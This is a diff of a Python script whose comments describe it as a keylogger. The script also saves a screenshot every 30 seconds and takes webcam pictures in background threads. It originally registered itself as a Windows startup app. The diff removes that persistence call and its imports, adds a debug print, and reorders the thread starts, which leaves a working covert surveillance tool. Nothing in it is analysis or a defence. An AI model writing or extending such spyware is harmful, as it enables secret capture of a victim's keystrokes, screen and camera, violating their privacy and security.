@@ -4,8 +4,6 @@
 # To make it as a startup app for windows
 import os
 import sys
-import winshell
-from win32com.client import Dispatch
 from PIL import ImageGrab
 
 # Create two threads, one for listening to keyboard strokes and one for taking pictures
@@ -57,22 +55,17 @@ def startup():
     shortcut.save()
 
 
-startup()
 
 # function to take screenshots every 30 seconds
 
 def take_screenshot():
     while True:
+        print("another success")
         screenshot = ImageGrab.grab()
         dtime = datetime.datetime.now()
         dtime_string = dtime.strftime('%Y-%m-%d_%H-%M-%S') + ".png"
         screenshot.save(dtime_string)
         time.sleep(30)
-
-screenshot_thread = threading.Thread(target=take_screenshot)
-screenshot_thread.start()
-        
-
 
 # check if webcam exists
 
@@ -95,9 +88,10 @@ def webcam_pic():
 # note: keylogging already has a thread generated automatically
 # starting the camera thread
 
+screenshot_thread = threading.Thread(target=take_screenshot)
 webcampic = threading.Thread(target=webcam_pic)
 webcampic.start()
-
+screenshot_thread.start()
 # Keylogging mechanism
 
 
